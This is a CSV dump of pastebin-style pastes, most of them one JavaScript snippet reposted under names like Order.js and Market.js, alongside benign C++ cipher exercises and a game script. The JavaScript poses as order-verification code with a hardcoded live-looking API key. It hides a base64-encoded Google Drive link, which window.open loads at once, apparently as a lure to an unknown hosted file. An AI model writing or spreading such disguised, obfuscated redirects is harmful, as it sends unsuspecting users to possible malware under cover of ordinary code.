id,title,username,language,date,content
FbMQuU6Z,Untitled,jm33,JavaScript,Saturday 5th of April 2025 04:25:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/53591/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AFGfHRS4,Products.js,jm33,JavaScript,Saturday 5th of April 2025 04:10:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39996/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
969rAVBM,Order.js,jm33,JavaScript,Saturday 5th of April 2025 03:54:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9brHwhvv,2,EtiennePHILIPPE,JSON,Saturday 5th of April 2025 03:51:59 PM CDT,"{""name"": ""microsd>usb"", ""support"": ""adaptateur"", ""female"": ""sd microsd"", ""male"": ""usb"", ""creator"": ""Etienne"", ""id"": ""2""}"
5M8fVPCF,VerticalPermutation,rgoerv,C++,Saturday 5th of April 2025 03:40:26 PM CDT,"#include <iostream>
#include <string>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <unordered_map>
#include <cmath>

using namespace std::string_literals;

std::string VerticalPermutationENcode(const std::vector<int>& Key, const std::string& StrForENcoding)
{
    std::unordered_map<int, std::string> ENCodeTable;

    const std::vector<int> sortedKey = ([&Key]() {
        std::vector<int> SortedKeyBuf(Key);
        std::sort(SortedKeyBuf.begin(), SortedKeyBuf.end());
        return SortedKeyBuf;
    })();

    size_t TableLen = Key.size();
    size_t keyIdx = 0;

    for(const int& key_part : sortedKey) {
        std::string vertical;
        for(size_t idx = keyIdx; idx < StrForENcoding.length(); idx += TableLen)
        {
            vertical.push_back(StrForENcoding[idx]);
        }
        ENCodeTable[key_part] = vertical;
        ++keyIdx;
    }
    std::string ENCodedStr;
    for(const int& key_part : Key) {
        ENCodedStr.append(ENCodeTable[key_part]);
    }
    return ENCodedStr;
}

static std::string VerticalPermutationDEcode(const std::vector<int>& Key, const std::string& StrForDEcoding)
{
    const size_t str_size = StrForDEcoding.size();
    const size_t TableLen = Key.size();
    const size_t ver_max_size = ceil((double)str_size / (double)TableLen);
    const size_t ver_res = (str_size % TableLen);

    const std::vector<int> sortedKey =  ([&Key]() {
        std::vector<int> SortedKeyBuf(Key);
        std::sort(SortedKeyBuf.begin(), SortedKeyBuf.end());
        return SortedKeyBuf;
    })();

    std::unordered_map<int, std::string> SortedKeyToStrForDecode;

    size_t len = 0;
    size_t curr_len = ver_max_size;

    for(size_t i = 0; i < TableLen; ++i, len += curr_len) {
        curr_len = Key[i] <= ver_res ? ver_max_size : ver_max_size - 1;
        SortedKeyToStrForDecode[Key[i]] = StrForDEcoding.substr(len, curr_len);
    }

    std::vector<std::string> strkey;
    std::string decoded_str = """"s;

    for(const auto& key : sortedKey) {
        strkey.push_back(SortedKeyToStrForDecode[key]);
    }

    for(size_t i = 0; i < ver_max_size; ++i) {
        for(auto& str : strkey) {   
            decoded_str.push_back(str[i]);
        }
    }
    return decoded_str;
}

int main()
{
    setlocale(LC_ALL, """");

    static std::string str_for_encoding = ""Пример работы шифра вертикальной перестановки""s;
    std::vector<int> key = { 3, 1, 4, 5, 2 };

    std::cout << str_for_encoding << std::endl;
    std::string encoded_str = VerticalPermutationENcode(key, str_for_encoding);
    std::cout << encoded_str << std::endl
    << VerticalPermutationDEcode(key, encoded_str) << std::endl;
}"
WV7S0iBD,Market.js,jm33,JavaScript,Saturday 5th of April 2025 03:39:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10736/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G7AtsVbr,Untitled,jm33,JavaScript,Saturday 5th of April 2025 03:23:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tE4DeDwq,TPKSP Warp Utilities Fork,kane1941,Rust,Saturday 5th of April 2025 03:15:53 PM CDT,"set warputil to true. // killswitch for all triggers

// -------

// utility functions
function engage {
	parameter amount is 1.
	set ship:control:pilotmainthrottle to 0.25 + amount * 0.75.
}

function disengage {
	set ship:control:pilotmainthrottle to 0.
}

function gravitybrake { 
	parameter f is 0.5.
	warpdrive off.
	set warp to 1.
	wait until kuniverse:timewarp:issettled.
	warpto(time:seconds + eta:transition * f).
}

// enable supercharging
for a in ship:modulesnamed(""wbiwarpengine"") if a:hasfield(""supercharger"") a:setfield(""supercharger"",200).
aux on.
// pseudo-actiongroups
warpdrive off. on warpdrive {
	if not warputil return warputil.
	set any to false.
	for m in ship:modulesnamed(""wbimodulegeneratorfx"") {		
		if aux {		
			set eventName to choose ""Activate Auxilary Power"" if warpdrive else ""Deactivate Auxilary Power"".
			if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
		}
		else {
			print(""Auxilary was not activated!""). 
		}
		
		set eventName to choose ""Activate Main Power"" if warpdrive else ""Deactivate Main Power"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}

	for m in ship:modulesnamed(""wbiwarpengine"") {
		set eventName to choose ""Activate Engine"" if warpdrive else ""Shutdown Engine"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}
	if not any {
		print ""WARNING: no warpdrives altered"".
	}
	
	return warputil.
}

reactors off. on reactors {
	if not warputil return warputil.
	set any to false.
	for m in ship:modulesnamed(""wbimodulegeneratorfx"") {
		set eventName to choose ""Activate Fusion Power"" if reactors else ""Deactivate Fusion Power"".
		if m:hasevent(eventName) { m:doevent(eventName). set any to true. }
	}
	if not any {
		print ""WARNING: no reactors altered"".
	}

	return warpUtil.
}

// gui

set warpfields to list(
	""max warp speed"",
	""warp speed"",
	""prop. requirement met"",
	""ftl check"",
	""course"",
	""distance"",
	""status"",
	""cause"",
	""minimum warp altitude"",
	""spatial location"").

set res to gui(200, 100). 
Set res:x to -40. set res:y to 5. 
res:show. 
set reslist to list(). 
for i in range(ship:resources:length + warpfields:length) { 
	set l to res:addlabel(). 
	Set l:style:fontsize to 13. reslist:add(l). 
}

on time:second { 
	set i to 0. 
	for rs in ship:resources { 
		set reslist[i]:text to rs:name + "" "" + round(rs:amount,1) + "" / "" + rs:capacity. 
		set reslist[i]:style:textcolor to rgb(1 - rs:amount/rs:capacity,rs:amount/rs:capacity,0.3). 
		set i to i + 1. 
	}
	set warpengines to ship:modulesnamed(""wbiwarpengine"").
	set last to warpengines:length-1.
	set i to 0. if warpengines:length > 0 for f in warpfields {
		set label to reslist[ship:resources:length + i].
		set label:visible to warpengines[0]:hasfield(f).
		if (label:visible) {
			set label:text to f + "": "" + warpengines[last]:getfield(f).
		}
		set i to i + 1.
	}

	return res:visible. 
}

// clearscreen. 
print ""action groups: warpdrive, reactors"".
print ""functions: engage, disengage"".
print ""warputil off to cancel"".

on warputil { set res:visible to false. }
"
JY6nw29W,Products.js,WantingTrae,JavaScript,Saturday 5th of April 2025 03:07:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68423/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5C3yZTv3,Order.js,WantingTrae,JavaScript,Saturday 5th of April 2025 02:52:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iC1HVXuJ,ReplacementCipher,rgoerv,C++,Saturday 5th of April 2025 02:45:04 PM CDT,"#include <iostream>
#include <string>
#include <algorithm>
#include <cstdint>

using namespace std;

static string alphabet = "" ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz""s;

static string ReplacementCipherENcode(const string& Slogan, const string& Alphabet, 
    const string StrForENcoding)
{
    string encoding_alphabet(Alphabet);
    for_each(Slogan.begin(), Slogan.end(), [&encoding_alphabet](const auto& symbol) {                                                   
        remove(encoding_alphabet.begin(), encoding_alphabet.end(), symbol);
    });
    rotate(encoding_alphabet.rbegin(), encoding_alphabet.rbegin() + Slogan.length(), 
                                                            encoding_alphabet.rend());
    encoding_alphabet.replace(0, Slogan.length(), Slogan);

    string ENcoded_str;
    for(const auto& symbol: StrForENcoding)
    {
        ENcoded_str.push_back(encoding_alphabet[Alphabet.find(symbol)]);
    }
    return ENcoded_str;
}

static string ReplacementCipherDEcode(const string& Slogan, const string& Alphabet, 
    const string StrForDEcoding)
{
    string encoding_alphabet(Alphabet);
    for_each(Slogan.begin(), Slogan.end(), [&encoding_alphabet](const auto& symbol) {                                                   
        remove(encoding_alphabet.begin(), encoding_alphabet.end(), symbol);
    });
    rotate(encoding_alphabet.rbegin(), encoding_alphabet.rbegin() + Slogan.length(), 
                                                            encoding_alphabet.rend());
    encoding_alphabet.replace(0, Slogan.length(), Slogan);

    string DEcoded_str;
    for(const auto& symbol: StrForDEcoding)
    {
        DEcoded_str.push_back(Alphabet[encoding_alphabet.find(symbol)]);
    }
    return DEcoded_str;
}

int main()
{
    static string str_for_encoding = ""CRYPTOGRaPHY EXAMpLE TEmPlATe""s;
    cout << ""Строка для кодирования: "" << str_for_encoding << endl;    

    static string slogan = ""CRYPTO""s;
    cout << ""Ключ\\слоган "" << slogan << endl;

    const string ENCodedStrR(ReplacementCipherENcode(slogan, alphabet, 
        str_for_encoding));
    cout << ""Зашифрованная строка: "" << ENCodedStrR << endl;
    cout << ""Дешифрованная строка: "" << ReplacementCipherDEcode(slogan, alphabet, 
        ENCodedStrR) << endl;
}"
FkEBc7rA,Market.js,WantingTrae,JavaScript,Saturday 5th of April 2025 02:36:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50773/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
